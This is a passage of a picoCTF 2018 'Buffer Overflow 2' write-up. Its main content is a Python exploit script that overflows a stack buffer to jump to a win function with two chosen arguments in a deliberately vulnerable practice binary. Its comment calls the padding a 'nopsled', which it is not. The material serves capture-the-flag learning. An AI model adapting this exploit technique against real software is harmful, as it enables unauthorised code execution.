
![binary_bof_2](https://github.com/SkyBulk/picoCTF2018/blob/master/images/binary_bof_2_5.png)


So we have so far win address + RET + args 1 + args 2 + exit. it's time to code it

```

#!/usr/bin/python
""" Buffer Overflow 2 From Pico CTF 2018"""
import struct
from subprocess import Popen, PIPE, STDOUT

payload = ''
payload += '\x41'*112 #nopsled
payload +=  struct.pack('<L', 0x080485cb) #win address
payload +=  struct.pack('<L', 0x080483f6) #RET
payload +=  struct.pack('<L', 0xDEADBEEF) #arg 1
payload +=  struct.pack('<L', 0xDEADC0DE) #arg 2
payload +=  struct.pack('<L', 0x8048470) #exit address 
filename = Popen(['./vuln'], stdin=PIPE)
filename.stdin.write(payload)

```




***

#### Thank you for the great reading.
